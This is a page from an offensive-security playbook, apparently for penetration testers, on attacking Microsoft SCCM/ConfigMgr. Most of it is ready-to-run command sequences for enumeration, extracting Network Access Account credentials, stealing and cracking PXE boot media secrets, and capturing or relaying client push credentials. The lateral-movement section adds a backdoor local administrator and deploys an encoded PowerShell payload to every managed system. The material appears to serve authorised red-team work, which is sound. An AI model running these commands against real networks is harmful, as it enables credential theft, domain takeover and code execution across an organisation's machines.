---
title: "18 · SCCM / ConfigMgr Attacks"
---

# 18 · SCCM / ConfigMgr Attacks

> SCCM has the keys to every managed machine. NAA accounts are the typical compromise.

!!! note "Phase overview"
    System Center Configuration Manager (SCCM/MECM) deploys software across the enterprise. 
    
    Two recurring weaknesses: 
      
      - (1) the Network Access Account (NAA) used to fetch deployment content is often a domain user with local admin EVERYWHERE, and the credentials are recoverable via DPAPI on any client OR via a fake PXE boot OR via the HTTP Management Point with a fake computer (using MAQ). 
      
      - (2) Client Push installations send creds to whatever machine you ask SCCM to install to, perfect for relay or capture.

### 18.1 · Enumerate SCCM

!!! info "Why this works / how it chains"

    sccmhunter is the canonical recon tool; it walks LDAP, finds management points, distribution points, and SMS_R_System (managed devices). SharpSCCM is the equivalent for Windows.

!!! warning "What leads here"
    - SCCM present in environment (very common in enterprises)
    - Any domain credentials
    - Signs: mSSMSSite, mSSMSManagementPoint LDAP attributes; computers named SCCM/CM/ConfigMgr/MECM; ports 80/443/8530/10123 on management server

```bash title="LDAP + sccmhunter + SharpSCCM"
# LDAP enumeration for SCCM assets
ldapsearch -x -H ldap://<DC_IP> -b "DC=domain,DC=local" \
  "(objectClass=mSSMSSite)" -D "user@domain.local" -w pass

# SCCMHunter - best tool for SCCM recon
pip install sccmhunter
python3 sccmhunter.py find \
  -u user -p pass -d domain.local -dc-ip <DC_IP>

# SharpSCCM (Windows)
.\SharpSCCM.exe get site-info
.\SharpSCCM.exe get class-instances SMS_ADMIN  # SCCM admins
.\SharpSCCM.exe get class-instances SMS_R_System  # managed computers

# Check for SCCM via BloodHound
# Look for: computers with SCCM client, SMS_* AD attributes
```


### 18.2 · NAA Credential Extraction

!!! info "Why this works / how it chains"

    Multiple paths into the NAA: sccmhunter http creates a fake computer via MAQ and asks the management point for its policies (which contain the NAA). SharpSCCM get secrets reads from WMI on a managed client. From SYSTEM on a client, DPAPI decrypts the NAA blob directly.

!!! warning "What leads here"
    - SCCM present with Network Access Accounts configured
    - Have any machine account OR local admin on an SCCM client
    - Machine Account Quota > 0 (create fake computer to get policies)

```bash title="Five different NAA extraction methods"
# Method 1: SCCMHunter HTTP module (creates fake computer via MAQ)
python3 sccmhunter.py http \
  -u user -p pass -d domain.local \
  -dc-ip <DC_IP> \
  -auto  # auto-creates machine account and retrieves NAA

# Method 2: SharpSCCM (from SCCM client machine)
.\SharpSCCM.exe get secrets
# Retrieves and deobfuscates NAA credentials from WMI

# Method 3: From SYSTEM on client (DPAPI decrypt)
# SystemDPAPIdump.py
python3 SystemDPAPIdump.py -creds -sccm \
  domain.local/user:pass@TARGET-PC

# Method 4: DPLoot
python3 dploot.py sccm \
  -d domain.local -u user -p pass TARGET-PC

# Method 5: SCCMSecrets.py (comprehensive)
python3 SCCMSecrets.py \
  --distribution-point 'sccm.domain.local' \
  -u user -p pass -d domain.local
```


### 18.3 · PXE Boot Abuse

!!! info "Why this works / how it chains"

    PXE boots a Windows PE image to install/reimage clients. The boot variables file contains task sequence credentials including the NAA. pxethief.py either downloads it without auth (unprotected) or returns a hashcat-format hash (mode 19850) for the password.

!!! warning "What leads here"
    - SCCM has PXE deployment configured
    - Network access to a PXE-enabled distribution point
    - PXE boot media not password protected (or weak password)

```bash title="Discover, download, decrypt"
# Step 1 - Find PXE server via DHCP broadcast
python3 pxethief.py 1  # broadcast discovery

# Step 2 - Target specific SCCM server
python3 pxethief.py 2 <SCCM_DISTRIBUTION_POINT_IP>
# Downloads encrypted media variables file

# Step 3a - No password (unprotected)
python3 pxethief.py 3 <media_variables_file>
# Directly extracts NAA credentials

# Step 3b - Password protected → crack hash
python3 pxethief.py 5 <media_variables_file>
# Returns hashcat-format hash

hashcat -m 19850 pxe_hash.txt wordlist.txt
# After cracking:
python3 pxethief.py 3 <media_variables_file> <cracked_password>

# Alternative: tftp download manually
tftp -i <SCCM_IP> GET "\SMSTemp\<variables_file>.boot.var" vars.boot.var
python3 pxethief.py 3 vars.boot.var
```


### 18.4 · SCCM Client Push Credential Capture

!!! info "Why this works / how it chains"

    When SCCM pushes a client install to a machine, it authenticates with the Client Push Account, which is typically a local admin on every endpoint. Run Responder, force a push to your IP (or wait), and capture the hash. Or relay it to a different target for instant lateral movement.

!!! warning "What leads here"
    - Automatic client push installation enabled
    - 'Allow connection fallback to NTLM' enabled
    - Can coerce or wait for push to a compromised machine

```bash title="Capture or relay client push"
# Set up Responder to capture client push credentials
responder -I tun0 -rdwv
# Wait for SCCM to push client installation
# Captures Client Push Account (often local admin on ALL clients!)

# Force client push (if you have SCCM admin)
.\SharpSCCM.exe invoke client-push -t TARGET-PC

# Relay client push to get shell
impacket-ntlmrelayx -tf targets.txt -smb2support -i
# Client push account authenticates → relay to other machines
```


### 18.5 · SCCM Lateral Movement (Deploy Application)

!!! info "Why this works / how it chains"

    If you compromise an SCCM admin, you have arbitrary code execution on every managed device; that's the entire point of SCCM. Deploy a 'package' that's actually your payload. SharpSCCM exec is the one-liner.

```bash title="Deploy app to target / collection"
# Deploy application to specific machine
.\SharpSCCM.exe exec -d TARGET-PC \
  -r "cmd /c net user hacker Pass123! /add && net localgroup administrators hacker /add"

# Deploy to collection
.\SharpSCCM.exe exec -n "All Systems" \
  -r "powershell -e <BASE64>"

# Via SCCMHunter
python3 sccmhunter.py admin \
  -u sccmadmin -p pass -d domain.local \
  -dc-ip <DC_IP> -mp sccm.domain.local
# Interactive admin console
```

